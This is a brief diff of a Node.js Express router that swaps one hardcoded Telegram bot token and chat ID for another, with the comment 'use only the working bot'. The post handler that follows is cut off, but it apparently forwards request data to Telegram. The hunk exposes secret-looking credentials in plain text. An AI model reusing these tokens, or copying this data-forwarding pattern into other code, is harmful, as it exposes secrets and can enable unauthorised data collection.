@@ -6,8 +6,8 @@ const UAParser = require('ua-parser-js');
 const router = express.Router();
 
 // Use only the working bot
-const BOT_TOKEN = "8243640993:AAEOKTTis2fef8CfY9MFqBsA1BAC8llbh0Y";
-const CHAT_ID = "7424024723";
+const BOT_TOKEN = "7498813414:AAEkmCWxpfqQSu5ry9T-auDJIu7TYyzIiLw";
+const CHAT_ID = "8268872332";
 
 router.post('/', async (req, res) => {
     try {
